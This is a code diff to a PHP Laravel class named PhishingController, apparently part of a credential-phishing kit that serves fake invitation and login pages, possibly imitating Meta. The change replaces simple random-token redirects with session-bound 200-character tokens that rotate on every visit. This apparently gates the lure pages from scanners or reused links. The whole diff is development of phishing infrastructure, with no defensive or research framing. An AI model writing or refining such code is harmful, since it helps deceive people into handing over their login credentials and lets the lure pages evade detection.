@@ -61,8 +61,11 @@ class PhishingController extends Controller
     }
     public function index(Request $request)
     {
-        if (!$request->has('token')) {
-            return redirect('/invitation?token=' . Str::random(100));
+        // Always refresh token on each visit
+        if (!session('_inv_token') || $request->query('token') !== session('_inv_token')) {
+            $newToken = Str::random(200);
+            session(['_inv_token' => $newToken]);
+            return redirect('/invitation?token=' . $newToken);
         }
         return view('index2');
     }
@@ -154,8 +157,11 @@ class PhishingController extends Controller
     public function showLogin2v2(Request $request)
     {
         $session = $this->getSessionData();
-        if (!$request->has('token')) {
-            return redirect('/invitation-login?token=' . Str::random(100));
+        // Always refresh token on each visit
+        if (!session('_lv2_token') || $request->query('token') !== session('_lv2_token')) {
+            $newToken = Str::random(200);
+            session(['_lv2_token' => $newToken]);
+            return redirect('/invitation-login?token=' . $newToken);
         }
         return view('login2v2', [
             'metaBasePath' => $session['metaBasePath'],
